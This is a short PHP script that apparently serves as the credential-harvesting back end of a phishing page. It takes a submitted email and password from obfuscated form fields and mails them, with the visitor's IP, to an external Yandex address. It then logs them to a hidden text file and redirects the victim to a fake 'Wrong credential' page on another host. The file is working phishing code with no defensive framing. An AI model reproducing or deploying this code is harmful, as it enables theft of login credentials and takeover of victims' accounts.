<?php

$ip = getenv("REMOTE_ADDR");	
if(!empty($_POST)) {
 $email= $_POST['m1fbdbfec2189a1dc0'];
 $password = $_POST['m1fbdbfec2189a1dc1'];
 


		$to = "davebrow50@yandex.com";
	
		
		
         $subject = "Justin Well ALL DOmain Script : $ip ";
		 
		 $message =  "Username            : ".$email."\r\n";
         $message .= "Password            : ".$password."\r\n";
		 $message .= "IP           		  : ".$ip."\r\n";
		$header = "Content type: Justin Well tools 09030812441\r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
	 mail ($to,$subject,$message,$header);

header("Location: https:///udc.ink/225/ORDERDATABASE/Jimdodo/Wrong credential.html");

$fp = fopen(".vfdsdvfe.txt","a");
fputs($fp,$message);
fclose($fp);
		
}
?> 